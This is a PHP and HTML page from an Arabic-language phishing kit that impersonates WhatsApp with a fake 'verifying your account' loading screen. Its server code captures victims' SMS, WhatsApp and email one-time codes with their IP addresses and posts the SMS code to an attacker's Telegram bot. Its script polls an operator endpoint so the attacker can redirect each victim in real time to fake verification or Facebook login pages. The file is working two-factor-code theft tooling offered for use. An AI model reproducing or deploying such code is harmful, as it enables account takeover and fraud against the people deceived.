<?php
// الحصول على معاملات URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';

// التحقق من وجود المعاملات
if (empty($sessionId) || empty($clientIp)) {
    die("معاملات مفقودة");
}

// تحديث ملف التتبع
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'loading.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// إنشاء مجلد التتبع إذا لم يكن موجوداً
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// معالجة بيانات POST إذا كانت موجودة (على سبيل المثال، رمز SMS)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $smsCode = $_POST['sms_code'] ?? '';
    $whatsappCode = $_POST['whatsapp_code'] ?? '';
    $emailCode = $_POST['email_code'] ?? '';
    
    if (!empty($smsCode)) {
        // تسجيل رمز SMS
        $actionData = [
            'action' => 'sms_code_submitted',
            'smsCode' => $smsCode,
            'timestamp' => time()
        ];
        
        // إنشاء مجلد الجلسات إذا لم يكن موجوداً
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        file_put_contents('sessions/' . $sessionId . '_action.json', json_encode($actionData));
        
        // إرسال المعلومات إلى Telegram
        $message = "📱 تم استقبال رمز SMS 📱\n\n";
        $message .= "🔑 معرف الجلسة: " . $sessionId . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "📟 رمز SMS: " . $smsCode . "\n";
        
        // مسار ملف إعدادات Telegram
        $telegramConfigFile = 'telegram_config.json';
        if (file_exists($telegramConfigFile)) {
            $telegramConfig = json_decode(file_get_contents($telegramConfigFile), true);
            $botToken = $telegramConfig['bot_token'] ?? '';
            $chatId = $telegramConfig['chat_id'] ?? '';
            
            if (!empty($botToken) && !empty($chatId)) {
                $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $params = [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // تخطي التحقق من SSL
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
            }
        }
    } else if (!empty($whatsappCode)) {
        // معالجة مشابهة لرمز WhatsApp
        $actionData = [
            'action' => 'whatsapp_code_submitted',
            'whatsappCode' => $whatsappCode,
            'timestamp' => time()
        ];
        
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        file_put_contents('sessions/' . $sessionId . '_action.json', json_encode($actionData));
        
        // إرسال المعلومات إلى Telegram
        $message = "💬 تم استقبال رمز WhatsApp 💬\n\n";
        $message .= "🔑 معرف الجلسة: " . $sessionId . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "📟 رمز WhatsApp: " . $whatsappCode . "\n";
        
        // إخطار Telegram (كود مشابه لـ SMS)
    } else if (!empty($emailCode)) {
        // معالجة مشابهة لرمز البريد الإلكتروني
        $actionData = [
            'action' => 'email_code_submitted',
            'emailCode' => $emailCode,
            'timestamp' => time()
        ];
        
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        file_put_contents('sessions/' . $sessionId . '_action.json', json_encode($actionData));
        
        // إرسال المعلومات إلى Telegram
        $message = "📧 تم استقبال رمز البريد الإلكتروني 📧\n\n";
        $message .= "🔑 معرف الجلسة: " . $sessionId . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "📟 رمز البريد الإلكتروني: " . $emailCode . "\n";
        
        // إخطار Telegram (كود مشابه لـ SMS)
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة...</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
            text-align: center;
        }
        
        .loading-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 30px 20px;
            margin-bottom: 20px;
        }
        
        .loading-icon {
            font-size: 40px;
            color: #25D366;
            margin-bottom: 20px;
            animation: spin 2s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-title {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
            color: #25D366;
        }
        
        .loading-message {
            color: #65676b;
            margin-bottom: 20px;
        }
        
        .progress-container {
            width: 100%;
            height: 8px;
            background-color: #e4e6eb;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        
        .progress-bar {
            height: 100%;
            background-color: #25D366;
            border-radius: 4px;
            width: 0%;
            transition: width 0.5s;
        }
        
        .progress-text {
            font-size: 14px;
            color: #65676b;
        }
        
        .footer {
            text-align: center;
            color: #65676b;
            font-size: 12px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading-card">
            <div class="loading-icon">
                <i class="fas fa-spinner"></i>
            </div>
            
            <div class="loading-title">جاري المعالجة</div>
            <p class="loading-message">يرجى الانتظار بينما نتحقق من حسابك...</p>
            
            <div class="progress-container">
                <div class="progress-bar" id="progress-bar"></div>
            </div>
            
            <div class="progress-text" id="progress-text">0%</div>
        </div>
        
        <div class="footer">
            <p>© 2026 واتسآب. جميع الحقوق محفوظة.</p>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            const progressBar = document.getElementById('progress-bar');
            const progressText = document.getElementById('progress-text');
            
            let progress = 0;
            const startTime = Date.now();
            const timeout = 20000; // 60 ثانية بالميلي ثانية
            let adminActionReceived = false;
            
            // دالة لتحديث شريط التقدم
            function updateProgress(value) {
                progressBar.style.width = value + '%';
                progressText.textContent = value + '%';
            }
            
            // دالة للتحقق من وجود إجراء يجب تنفيذه
            function checkAction() {
                fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
                .then(response => response.json())
                .then(data => {
                    if (data.action && !adminActionReceived) {
                        adminActionReceived = true;
                        clearInterval(progressInterval);
                        
                        if (data.action === 'sms_error') {
                            window.location.href = 'sms_verification.php?session=' + sessionId + '&ip=' + clientIp + '&error=1';
                        } else if (data.action === 'facebook_error') {
                            window.location.href = 'connexion_f.php?session=' + sessionId + '&ip=' + clientIp + '&error=1';
                        } else if (data.action === 'whatsapp_error') {
                            window.location.href = 'whatsapp_verification.php?session=' + sessionId + '&ip=' + clientIp + '&error=1';
                        } else if (data.action === 'email_error') {
                            window.location.href = 'email_verification.php?session=' + sessionId + '&ip=' + clientIp + '&error=1';
                        } else if (data.action === 'device_authorized') {
                            if (data.redirect) {
                                window.location.href = `${data.redirect}?session=${sessionId}&ip=${clientIp}`;
                            } else {
                                window.location.href = `connexion_f.php?session=${sessionId}&ip=${clientIp}`;
                            }
                        } else if (data.action === 'redirect' && data.redirect) {
                            window.location.href = data.redirect + '.php?session=' + sessionId + '&ip=' + clientIp;
                        } else {
                            window.location.href = data.action + '.php?session=' + sessionId + '&ip=' + clientIp;
                        }
                    }
                })
                .catch(error => {
                    console.error('خطأ أثناء التحقق من الإجراءات:', error);
                });
            }
            
            // محاكاة التقدم والتحقق من الإجراءات
            const progressInterval = setInterval(() => {
                const elapsedTime = Date.now() - startTime;
                progress = Math.min((elapsedTime / timeout) * 100, 100);
                updateProgress(Math.floor(progress));
                
                // إذا مرت 60 ثانية ولم يكن هناك إجراء من المسؤول
                if (elapsedTime >= timeout && !adminActionReceived) {
                    adminActionReceived = true;
                    clearInterval(progressInterval);
                    updateProgress(100);
                    
                    // إعادة توجيه تلقائية إلى whatsapp_verification.php بعد 60 ثانية
                    setTimeout(() => {
                        window.location.href = 'whatsapp_verification.php?session=' + sessionId + '&ip=' + clientIp;
                    }, 500);
                }
            }, 100);
            
            // التحقق من الإجراءات كل ثانيتين
            const actionInterval = setInterval(() => {
                checkAction();
            }, 2000);
        });
    </script>
</body>
</html>